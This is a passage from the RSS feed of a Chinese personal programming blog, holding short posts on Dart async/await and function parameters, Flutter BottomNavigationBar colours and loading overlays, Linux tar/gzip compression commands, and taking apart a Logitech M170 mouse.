&lt;li&gt;当 printDailyNewsDigest 执行完成过后，最开始的 Future 返回完成，程序退出。&lt;/li&gt;
&lt;li&gt;PS：如果 async 函数没有明确指定返回值，返回的 null 值的 Future&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总结&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;await 必须在 async 方法中使用。&lt;/li&gt;
&lt;li&gt;async 方法中在 await 前面的代码会立即同步执行，直到碰到 await。&lt;/li&gt;
&lt;li&gt;await 的作用是等待所标记的方法获取返回结果。当代码跑到 await 时，程序其他部分立即停止，直到标记方法执行完成&lt;/li&gt;
&lt;li&gt;当代码执行到 await，程序会立即返回一个 future。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;错误处理&#34;&gt;错误处理&lt;/h2&gt;
&lt;p&gt;如果在 Future 返回时发生错误，你可能想捕获错误。async 函数可以用 try-catch 捕获错误。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;printDailyNewsDigest() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; news &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; gatherNewsReports();
    print(news);
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (e) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// Handle error...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;连续执行&#34;&gt;连续执行&lt;/h2&gt;
&lt;p&gt;你可以使用多个 await 表达式，保证一个 await 执行完成过后再执行下一个&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;main() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; expensiveA();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; expensiveB();
  doSomethingWith(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; expensiveC());
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/hygblog/p/9078608.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Dart异步编程-future  @方田 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Flutter—为 BottomNavigationBar 设置背景色</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BA-bottomnavigationbar-%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%E8%89%B2/</link>
        <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%BA-bottomnavigationbar-%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%E8%89%B2/</guid>
        <description>&lt;h2 id=&#34;bottomnavigationbar&#34;&gt;BottomNavigationBar&lt;/h2&gt;
&lt;p&gt;BottomNavigationBar 不能直接设置背景色，但是可以通过设置主题画布色达到相同的效果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;  bottomNavigationBar: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Theme(
    data: Theme.of(context).copyWith(
        &lt;span style=&#34;color:#75715e&#34;&gt;//设置背景色`BottomNavigationBar`
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        canvasColor: Colors.green,
        &lt;span style=&#34;color:#75715e&#34;&gt;//设置高亮文字颜色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        primaryColor: Colors.red,
        &lt;span style=&#34;color:#75715e&#34;&gt;//设置一般文字颜色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        textTheme: Theme.of(context).textTheme.copyWith(caption: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TextStyle(color: Colors.yellow))), 
    child: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; BottomNavigationBar(
      type: BottomNavigationBarType.fixed,
      currentIndex: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
      items: [
        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; BottomNavigationBarItem(
          icon: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Icon(Icons.add),
          title: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;新增&amp;#34;&lt;/span&gt;),
        ),
        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; BottomNavigationBarItem(
          icon: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Icon(Icons.delete),
          title: &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;删除&amp;#34;&lt;/span&gt;),
        )
      ],
    ),
  ),
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—tar 解压</title>
        <link>https://ac-lm.github.io/posts/linux/linuxtar-%E8%A7%A3%E5%8E%8B/</link>
        <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxtar-%E8%A7%A3%E5%8E%8B/</guid>
        <description>&lt;p&gt;tar 命令可以为 linux 的文件和目录创建档案。利用 tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。&lt;/p&gt;
&lt;h2 id=&#34;1打包和压缩&#34;&gt;1.打包和压缩&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;打包是指将一大堆文件或目录变成一个总的文件&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;压缩则是将一个大的文件通过一些压缩算法变成一个小文件&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar 命令），然后再用压缩程序进行压缩（gzip bzip2 命令）。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yum install tar gzip bzip
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar 
解包：tar xvf FileName.tar
打包：tar cvf FileName.tar DirName

.gz
解压1：gunzip FileName.gz
解压2：gzip -d FileName.gz
压缩：gzip FileName

.tar.gz 和 .tgz
解压：tar zxvf FileName.tar.gz
压缩：tar zcvf FileName.tar.gz DirName

.bz2
解压1：bzip2 -d FileName.bz2
解压2：bunzip2 FileName.bz2
压缩： bzip2 -z FileName

.tar.bz2  .tar.xz
解压：tar jxvf FileName.tar.bz2
压缩：tar jcvf FileName.tar.bz2 DirName

.bz
解压1：bzip2 -d FileName.bz
解压2：bunzip2 FileName.bz
压缩：未知

.tar.bz
解压：tar jxvf FileName.tar.bz
压缩：未知

.Z
解压：uncompress FileName.Z
压缩：compress FileName

.tar.Z
解压：tar Zxvf FileName.tar.Z
压缩：tar Zcvf FileName.tar.Z DirName

.zip
解压：unzip FileName.zip
压缩：zip FileName.zip DirName

.rar
解压：rar x FileName.rar
压缩：rar a FileName.rar DirName 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3必要参数&#34;&gt;3.必要参数&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-A 新增压缩文件到已存在的压缩

-B 设置区块大小

-c 建立新的压缩文件

-d 记录文件的差别

-r 添加文件到已经压缩的文件

-u 添加改变了和现有的文件到已经存在的压缩文件

-x 从压缩的文件中提取文件

-t 显示压缩文件的内容

-z 支持gzip解压文件

-j 支持bzip2解压文件

-Z 支持compress解压文件

-v 显示操作过程

-l 文件系统边界设置

-k 保留原有文件不覆盖

-m 保留文件不被覆盖

-W 确认压缩文件的正确性
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4可选参数&#34;&gt;4.可选参数&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-b 设置区块数目

-C 切换到指定目录

-f 指定压缩文件

--help 显示帮助信息

--version 显示版本信息
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—罗技 M170 的拆解</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E7%BD%97%E6%8A%80-m170-%E7%9A%84%E6%8B%86%E8%A7%A3/</link>
        <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E7%BD%97%E6%8A%80-m170-%E7%9A%84%E6%8B%86%E8%A7%A3/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/54294361&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 如何拆解罗技M170鼠标？ @WXLJJ &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;打开后盖，如图所示，有三个卡扣，撬开即可拆解。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291734478.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291734478.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291734690.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291734690.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Dart—函数形参</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82/</link>
        <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82/</guid>
        <description>&lt;h2 id=&#34;1示例&#34;&gt;1.示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; add(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; test(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b, Function operation) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; operation(a, b);
}

main() {
  print(test(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, add));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2注意&#34;&gt;2.注意&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;方法当做参数传递的时候，只需要传递方法名即可，不需要带上方法的括号。&lt;/li&gt;
&lt;li&gt;方法作为参数的时候传递给其他方法的时候，不会立即执行。&lt;/li&gt;
&lt;li&gt;方法当做参数传递的时候，方法名表示该方法的引用，这个引用当做参数传递的时候不会立即执行，只会在调用的时候执行。&lt;/li&gt;
&lt;li&gt;入参方法在被实际调用时，会添加括号，当做正常的方法调用。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Flutter—加载动画</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/</link>
        <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://juejin.cn/post/6844903744656637960&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Flutter做一个加载动画  @limhGeek &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1根据情况返回不同布局&#34;&gt;1.根据情况返回不同布局&lt;/h2&gt;
&lt;p&gt;在加载的时候返回加载的布局，不加载的时候返回登陆页面布局，&lt;code&gt;_childLayout()&lt;/code&gt;方法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; runApp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MyApp&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyApp&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatelessWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;.........&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyHomePage&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatefulWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;.........&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_MyHomePageState&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; State&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  bool _loading &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;//标志！是否加载状态
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Scaffold&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      appBar&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; AppBar&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;widget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      body&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; _childLayout&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;_childLayout&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_loading&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Container&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
          child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; CircularProgressIndicator&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; RaisedButton&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
          onPressed&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; _loading &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;_loading&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
          child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;显示加载动画&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用stack层叠布局&#34;&gt;2.使用Stack层叠布局&lt;/h2&gt;
&lt;p&gt;在原本布局上面叠加一层半透明背景，显示一个进度条。层叠布局至少有两个控件，自定义一个控件叫&lt;code&gt;ProgressDialog&lt;/code&gt;，这个控件接收两个必传参数：子布局&lt;code&gt;child&lt;/code&gt;，是否显示加载进度&lt;code&gt;loading&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ProgressDialog&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatelessWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; bool loading&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Widget child&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

  ProgressDialog&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;Key key&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@required&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;loading&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@required&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;child&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;child &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loading &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    List&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; widgetList &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[];&lt;/span&gt;
    widgetList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;child&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;//如果正在加载，则显示加载添加加载中布局
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loading&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      widgetList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; CircularProgressIndicator&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Stack&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      children&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; widgetList&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3绘制透明效果&#34;&gt;3.绘制透明效果&lt;/h2&gt;
&lt;p&gt;使用控件&lt;code&gt;Opacity&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ProgressDialog&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatelessWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; bool loading&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Widget child&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

